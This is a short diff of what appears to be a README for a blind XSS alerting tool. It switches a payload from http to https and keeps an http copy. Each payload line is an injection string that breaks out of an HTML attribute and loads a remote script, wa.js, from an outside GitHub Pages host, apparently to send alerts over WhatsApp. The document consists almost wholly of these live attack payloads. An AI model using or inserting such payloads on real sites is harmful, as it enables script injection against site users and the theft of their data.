@@ -14,6 +14,6 @@ Blind XSS Alert Telegram
 
 whatsapp
 
-```"><script src=http://tucommenceapousser.github.io/bxss/wa.js></script>```
+```"><script src=https://tucommenceapousser.github.io/bxss/wa.js></script>```
 
 ```"><script src=http://tucommenceapousser.github.io/bxss/wa.js></script>```
